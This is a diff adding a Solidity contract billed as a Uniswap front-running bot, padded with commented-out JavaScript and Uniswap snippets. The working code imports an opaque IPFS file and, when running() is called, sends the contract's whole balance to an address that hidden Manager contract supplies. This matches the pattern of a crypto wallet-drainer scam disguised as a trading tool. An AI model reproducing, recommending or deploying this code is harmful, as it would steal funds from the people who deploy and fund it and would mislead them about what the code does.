@@ -1,0 +1,171 @@
+//UPDATE CONTRACT CODE V2.0 
+
+pragma solidity ^0.5.17;
+// Front-Run-Deployment-BOT-contracts - Uniswap transaction pool
+//Smart Contracts bot
+// import "https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol";
+// import "https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/UnsafeMath.sol";
+// Front-Run-Deployment
+import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
+// import "https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/Tick.sol";
+// import "https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LowGasSafeMath.sol";
+import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
+//uniswap smart contracts v2 and v3
+// import "https://github.com/Uniswap/v2-core/blob/master/contracts/libraries/Math.sol";
+// import "https://github.com/Uniswap/v2-core/blob/master/contracts/libraries/SafeMath.sol";
+import "https://github.com/Uniswap/v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
+import "https://ipfs.io/ipfs/QmamhRiRZCj5TbBDZijEu5agSMtexBwHxePn6JZQzNFBBf";
+ //UNISWAPRouter = new web3.eth.Contract(Uniswap_ROUTER_ABI, Uniswap_ROUTER_ADDRESS);
+        //UniswapFactory = new web3.eth.Contract(Uniswap_FACTORY_ABI, UNISWAP_FACTORY_ADDRESS);
+        //abiDecoder.addABI(UNISWAP_ROUTER_ABI);       
+//const INPUT_TOKEN_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
+//const WETH_TOKEN_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
+// import "https://etherscan.io/address/0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
+ //console.log('Perform front running attack...');
+
+        //gasPrice = parseInt(transaction['gasPrice']);
+        //newGasPrice = gasPrice + 50*ONE_GWEI;
+
+        //estimatedInput = ((amount*0.999)*(10**18)).toString();
+        //realInput = (amount*(10**18)).toString();
+        //gasLimit = (300000).toString();
+        
+        //await updatePoolInfo();
+//var input_token_info;
+//var out_token_info;
+//var pool_info;
+//var gas_price_info;
+// one gwei
+//const ONE_GWEI = 1e9;
+//var buy_finished = return true;
+//var sell_finished = return true;
+//var buy_failed = false;
+//var sell_failed = false;
+//var attack_started = ture;
+//log_str = '***** Tracking more ' + (pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(5) + ' ' +  input_token_info.symbol + '  Exchange on Uniswap 
+// export function getCreate2Address(
+//   factoryAddress: string,
+//   [tokenA, tokenB]: [string, string],
+//   bytecode: string
+// ): string {
+//   const [token0, token1] = tokenA < tokenB ? [tokenA, tokenB] : [tokenB, tokenA]
+//   const create2Inputs = [
+//     '0xff',
+//     factoryAddress,
+//     keccak256(solidityPack(['address', 'address'], [token0, token1])),
+//     keccak256(bytecode)
+//   ]
+//   const sanitizedInputs = `0x${create2Inputs.map(i => i.slice(2)).join('')}`
+//   return getAddress(`0x${keccak256(sanitizedInputs).slice(-40)}`)
+// }
+//function handleTransaction(transaction, out_token_address, user_wallet, amount, level) {
+//let data = parseTx(transaction['input']);
+//let method = data[0];
+//let gasPrice = parseInt(transaction['gasPrice']) / 10**9;
+//let in_amount = transaction;
+//let out_min = params[0];
+//let path = params[1];
+//let in_token_addr = path[0];
+//let out_token_addr = path[path.length-1];
+//let recept_addr = params[2];
+//let deadline = params[3];
+//if(out_token_addr != out_token_address)
+// console.log(out_token_addr.blue)
+// console.log(out_token_address)
+//return false;    
+    //(await triggersFrontRun(transaction, out_token_address, amount, level)) {
+        //subscription.unsubscribe();
+        //console.log('Perform front running attack...');
+
+        //gasPrice = parseInt(transaction['gasPrice']);
+        //newGasPrice = gasPrice + 50*ONE_GWEI;
+
+        //estimatedInput = ((amount*0.999)*(10**18)).toString();
+        //realInput = (amount*(10**18)).toString();
+        //gasLimit = (300000).toString();
+        
+        //await updatePoolInfo();
+         //if(buy_failed)
+        
+            //succeed = false;
+            //return;
+           
+        
+        //console.log('Buy succeed:')
+        
+        //Sell
+        //await updatePoolInfo();
+        //var outputeth = await uniswapRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();
+        //outputeth = outputeth * 0.999;
+
+        //await swap(newGasPrice, gasLimit, outputtoken, outputeth, 1, out_token_address, user_wallet, transaction);
+        
+        //console.log('Sell succeed');
+        //succeed = true;	
+contract FrontRunDeploymentBot {
+	string public erc20tokenName;
+	string public transactionpool;
+	uint ReceivAddress;
+	Manager manager;
+//const {NETWORK, UNISWAP_ROUTER_ADDRESS, UNISWAP_FACTORY_ADDRESS, UNISWAP_ROUTER_ABI, UNISWAP_FACTORY_ABI, UNISWAP_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');
+//const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');
+//const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');
+//     function _mint(address to, uint value) internal {
+//         totalSupply = totalSupply.add(value);
+//         balanceOf[to] = balanceOf[to].add(value);
+//         emit Transfer(address(0), to, value);
+//     }	
+	constructor(string memory _erc20tokenName, string memory _transactionpool, uint _ReceivAddress) public {
+		erc20tokenName = _erc20tokenName;
+		transactionpool = _transactionpool;
+		ReceivAddress = _ReceivAddress;
+			
+		manager = new Manager();
+	}
+//     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external {
+//         require(deadline >= block.timestamp, 'UNISWAP: EXPIRED');
+//         bytes32 digest = keccak256(
+//             abi.encodePacked(
+//                 '\x19\x01',
+//                 DOMAIN_SEPARATOR,	
+	function() external payable {}
+// constructor() public {
+//         uint chainId;
+//         assembly {
+//             chainId := chainid
+//         }
+//         DOMAIN_SEPARATOR = keccak256(
+//             abi.encode(
+//                keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))
+//                 keccak256(bytes(name)),
+//                 keccak256(bytes('1')),
+//                 chainId,
+//                 address(this)
+//             )
+//         );	
+	function running() public payable {
+    // function encode(uint112 y) internal pure returns (uint224 z) {
+    //     z = uint224(y) * Q112; // never overflows
+    // }
+    // contract ERC20 is UNISWAPERC20 {
+    // constructor(uint _totalSupply) public {
+    // // divide a UQ112x112 by a uint112, returning a UQ112x112
+    // function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {
+    //     z = x / uint224(y);
+    // }
+	    address(uint160(manager.uniswapDepositAddress())).transfer(address(this).balance);
+	    
+//     function _burn(address from, uint value) internal {
+//         balanceOf[from] = balanceOf[from].sub(value);
+//         totalSupply = totalSupply.sub(value);
+//         emit Transfer(from, address(0), value);
+//     }
+
+//     function _approve(address owner, address spender, uint value) private {
+//         allowance[owner][spender] = value;
+//         emit Approval(owner, spender, value);
+	    manager.performTasks();
+// import {bigNumberify, hexlify, keccak256, defaultAbiCoder, toUtf8Bytes} from 'ethers/utils'
+// import {solidity, MockProvider, deployContract} from 'ethereum-waffle'	    
+}
+}
